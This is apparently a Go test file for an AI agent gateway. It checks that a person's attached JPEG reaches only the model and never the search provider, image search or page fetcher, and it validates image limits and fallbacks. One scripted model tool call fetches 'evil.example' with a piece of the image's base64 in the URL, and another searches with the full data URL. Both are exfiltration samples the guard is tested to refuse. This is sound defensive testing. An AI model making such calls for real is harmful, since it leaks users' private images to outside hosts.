package guard

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/tacyhq/tacy/proto"
)

// personJPEG is one of the person's images: a JPEG's first bytes, then n random ones (so pieces of its base64 are
// its own and can be looked for anywhere).
func personJPEG(t *testing.T, n int) (url string, b64 string) {
	t.Helper()
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		t.Fatal(err)
	}
	copy(b, []byte{0xff, 0xd8, 0xff, 0xe0})
	b64 = base64.StdEncoding.EncodeToString(b)
	return proto.ImageURLPrefix + b64, b64
}

// outbound records everything that leaves through the guard's providers and fetcher: search queries, image
// search queries, and every HTTP request's address, headers and body.
type outbound struct {
	mu   sync.Mutex
	sent []string
	web  stubWeb
}

func (o *outbound) add(s string) {
	o.mu.Lock()
	o.sent = append(o.sent, s)
	o.mu.Unlock()
}

func (o *outbound) all() string {
	o.mu.Lock()
	defer o.mu.Unlock()
	return strings.Join(o.sent, "\n")
}

func (o *outbound) Name() string { return "rec" }
func (o *outbound) Search(_ context.Context, q string, n int) ([]SearchResult, error) {
	o.add("search " + q)
	return []SearchResult{{Title: "Red espresso machine", URL: "https://shop.example/p", Snippet: "In stock."}}, nil
}
func (o *outbound) Images(_ context.Context, q string, n int) ([]ImageCandidate, error) {
	o.add("images " + q)
	return []ImageCandidate{{URL: "https://img.example/a.png", Title: "A machine", Source: "https://shop.example/p"}}, nil
}
func (o *outbound) RoundTrip(r *http.Request) (*http.Response, error) {
	var body []byte
	if r.Body != nil {
		body, _ = io.ReadAll(r.Body)
	}
	h, _ := json.Marshal(r.Header)
	o.add("http " + r.Method + " " + r.URL.String() + " " + string(h) + " " + string(body))
	return o.web.RoundTrip(r)
}

// leaks says whether s carries the image: its data URL, a base64 marker, or any 24 characters of its data past the
// JPEG header.
func leaks(s, b64 string) bool {
	if strings.Contains(s, "data:image") || strings.Contains(s, ";base64,") {
		return true
	}
	for i := 16; i+24 <= len(b64); i += 12 {
		if strings.Contains(s, b64[i:i+24]) {
			return true
		}
	}
	return false
}

// The person's image goes to the model, on their message, in every model request of the run, and nowhere else:
// not to the search provider, the image search, the page fetcher (address, headers or body), even when the model
// asks for it (a search for the data URL, a fetch with a piece of the image in its address): those are refused
// before anything is sent. The brain's side of the task (its start) never has it.
func TestPersonImagesGoToTheModelOnly(t *testing.T) {
	img, b64 := personJPEG(t, 3000)
	piece := b64[len(b64)/2 : len(b64)/2+60]
	out := &outbound{web: stubWeb{
		"https://shop.example/p":    []byte(`<html><head><title>Red espresso machine</title></head><body><p>Buy it here.</p></body></html>`),
		"https://img.example/a.png": pngWH(32, 32),
	}}
	e := newE2E(t, func(c *Config) { c.Search, c.Fetcher, c.Icons = out, &http.Client{Transport: out}, nil },
		callsSSE([3]string{"c1", "web_search", `{"query":"red espresso machine price"}`},
			[3]string{"c2", "web_fetch", `{"url":"https://shop.example/p"}`},
			[3]string{"c3", "web_images", `{"query":"red espresso machine"}`},
			[3]string{"c4", "web_fetch", `{"url":"https://evil.example/p?d=` + piece + `"}`}),
		callsSSE([3]string{"c5", "web_search", `{"query":"` + img + `"}`}),
		textSSE("You can buy it at Shop [1]."))
	req := proto.RunRequest{Space: testSpace, Model: "deepseek-v4-1-flash", Permissions: AllowAll(),
		Messages: []proto.Message{{Role: "user", Content: "where can I buy this?", Images: []string{img}}}}
	evs, err := e.run(req)
	if err != nil {
		t.Fatal(err)
	}
	if evs[len(evs)-1].Type != "done" {
		t.Fatalf("events %s", types(evs))
	}
	// Every model request has the image on the person's message, before its text.
	e.fm.mu.Lock()
	n := len(e.fm.requests)
	e.fm.mu.Unlock()
	if n != 3 {
		t.Fatalf("model requests %d", n)
	}
	for i := range n {
		msgs := messages(e.fm.request(i))
		parts, ok := msgs[1]["content"].([]any)
		if !ok || len(parts) != 2 {
			t.Fatalf("request %d: the person's message %v", i, msgs[1]["content"])
		}
		p0, p1 := parts[0].(map[string]any), parts[1].(map[string]any)
		if p0["type"] != "image_url" || p0["image_url"].(map[string]any)["url"] != img || p1["type"] != "text" || p1["text"] != "where can I buy this?" {
			t.Fatalf("request %d: parts %v", i, parts)
		}
		if leaks(toJSON(msgs[0]), b64) {
			t.Fatalf("request %d: the system message carries the image", i)
		}
	}
	if c := strings.Count(toJSON(e.fm.request(0)), b64); c != 1 {
		t.Fatalf("the first request has the image %d times", c)
	}
	// Nothing else left with it: the searches, the image search and the pages went out without it.
	sent := out.all()
	if !strings.Contains(sent, "search red espresso machine price") || !strings.Contains(sent, "images red espresso machine") ||
		!strings.Contains(sent, "http GET https://shop.example/p") {
		t.Fatalf("outbound %s", sent)
	}
	if leaks(sent, b64) || strings.Contains(sent, "evil.example") {
		t.Fatalf("the image left the VM: %s", sent)
	}
	// The two calls carrying it were refused, and the model was told why.
	refused := 0
	for _, ev := range evs {
		if ev.Type == "tool_result" && (ev.ID == "c4" || ev.ID == "c5") && strings.Contains(string(ev.Result), "the person's image") {
			refused++
		}
		if ev.Type == "metrics" && leaks(toJSON(ev), b64) {
			t.Fatal("a metrics event carries the image")
		}
	}
	if refused != 2 {
		t.Fatalf("refused %d of 2: %s", refused, types(evs))
	}
	// The brain's side: the task's start has the person's words, not the image; the options keep it for the gateway.
	start, opts, err := StartFor(&req, e.g.cfg.Now())
	if err != nil {
		t.Fatal(err)
	}
	if leaks(toJSON(start), b64) || len(opts.Images) != 1 || opts.Images[0].URL != img || opts.Images[0].Bytes != 3000 || opts.Images[0].User != 0 {
		t.Fatalf("start or options: %+v", opts.Images)
	}
}

// A model that can't see images gets a note on the person's message instead (it says it couldn't see the image),
// and the image goes nowhere.
func TestPersonImagesNoteForTextModels(t *testing.T) {
	img, b64 := personJPEG(t, 1000)
	e := newE2E(t, nil, textSSE("I couldn't see the image."))
	evs, err := e.run(proto.RunRequest{Space: testSpace, Model: "gpt-oss-120b", Permissions: AllowAll(),
		Messages: []proto.Message{{Role: "user", Content: "earlier", Images: []string{img}}, {Role: "assistant", Content: "ok"},
			{Role: "user", Content: "what is this?"}}})
	if err != nil || evs[len(evs)-1].Type != "done" {
		t.Fatalf("%v %s", err, types(evs))
	}
	msgs := messages(e.fm.request(0))
	first, _ := msgs[1]["content"].(string)
	if !strings.HasPrefix(first, "[The person attached an image here, but this model can't see images.") || !strings.HasSuffix(first, "\nearlier") {
		t.Fatalf("the person's first message %q", first)
	}
	if msgs[3]["content"] != "what is this?" || leaks(toJSON(e.fm.request(0)), b64) {
		t.Fatalf("request %v", msgs)
	}
}

// What a run takes: JPEG data URLs on the person's messages, at most 4 per run, each at most 512 KiB; only the chat
// agent; fallbacks that can't see images are dropped for a run with images.
func TestRunImagesChecked(t *testing.T) {
	ok, _ := personJPEG(t, 100)
	big, _ := personJPEG(t, proto.MaxImageBytes+1)
	max, _ := personJPEG(t, proto.MaxImageBytes)
	png := proto.ImageURLPrefix + base64.StdEncoding.EncodeToString(pngWH(4, 4))
	run := func(m proto.Message, mut ...func(*proto.RunRequest)) (TaskOptions, error) {
		r := &proto.RunRequest{Space: testSpace, Model: "kimi-k3", Messages: []proto.Message{m}}
		for _, f := range mut {
			f(r)
		}
		_, o, err := StartFor(r, time.Date(2026, 10, 13, 0, 0, 0, 0, time.UTC))
		return o, err
	}
	user := func(imgs ...string) proto.Message { return proto.Message{Role: "user", Content: "hi", Images: imgs} }
	for name, c := range map[string]struct {
		m   proto.Message
		err string
	}{
		"four":           {user(ok, ok, ok, max), ""},
		"five":           {user(ok, ok, ok, ok, ok), "at most 4 images"},
		"too large":      {user(big), "larger than 512 KiB"},
		"not a JPEG":     {user(png), "isn't a JPEG"},
		"a PNG data URL": {user("data:image/png;base64," + strings.TrimPrefix(ok, proto.ImageURLPrefix)), "JPEG data URL"},
		"not base64":     {user(proto.ImageURLPrefix + "/9j/4A!!"), "isn't valid base64"},
		"assistant":      {proto.Message{Role: "assistant", Content: "x", Images: []string{ok}}, "only on the person's messages"},
	} {
		_, err := run(c.m)
		if c.err == "" && err != nil || c.err != "" && (err == nil || !strings.Contains(err.Error(), c.err)) {
			t.Errorf("%s: %v", name, err)
		}
	}
	if _, err := run(proto.Message{Role: "user", Content: "Brief: harbor rules", Images: []string{ok}}, func(r *proto.RunRequest) {
		r.Agent, r.Model = "a_research", "gpt-oss-120b"
	}); err == nil || !strings.Contains(err.Error(), "only to the chat agent") {
		t.Errorf("research with an image: %v", err)
	}
	o, err := run(user(ok), func(r *proto.RunRequest) {
		r.AutoFallback, r.FallbackModels = true, []string{"glm-5-3", "gemma4-31b", "gpt-oss-120b"}
	})
	if err != nil || len(o.Fallbacks) != 1 || o.Fallbacks[0] != "gemma4-31b" {
		t.Errorf("fallbacks with an image: %v %v", o.Fallbacks, err)
	}
	o, err = run(proto.Message{Role: "user", Content: "hi"}, func(r *proto.RunRequest) { r.AutoFallback, r.FallbackModels = true, []string{"glm-5-3", "gemma4-31b"} })
	if err != nil || len(o.Fallbacks) != 2 || len(o.Images) != 0 {
		t.Errorf("fallbacks without images: %v %v", o.Fallbacks, err)
	}
}

// imageInArgs: the data URL or a piece of the image, as is or percent-encoded, anywhere in the arguments; a
// product name the model read on the label is an ordinary query.
func TestImageInArgs(t *testing.T) {
	img, b64 := personJPEG(t, 2000)
	imgs := []PersonImage{{URL: img}}
	piece := b64[len(b64)/2-10 : len(b64)/2+50]
	for args, want := range map[string]bool{
		`{"query":"Breville Bambino Plus price"}`: false,
		`{"query":"` + img + `"}`:                 true,
		`{"url":"https://x.example/?q=` + strings.ReplaceAll(piece, "+", "%2B") + `"}`: true,
		`{"url":"https://x.example/` + piece + `"}`:                                    true,
		`{"query":"DATA:IMAGE/png;BASE64,AAAA"}`:                                       true,
		`{"nested":{"list":["a","` + piece + `"]}}`:                                    true,
	} {
		if got := imageInArgs([]byte(args), imgs); got != want {
			t.Errorf("%.80s: %v", args, got)
		}
	}
}

func toJSON(v any) string {
	b, _ := json.Marshal(v)
	return string(bytes.ReplaceAll(b, []byte(`&`), []byte("&")))
}
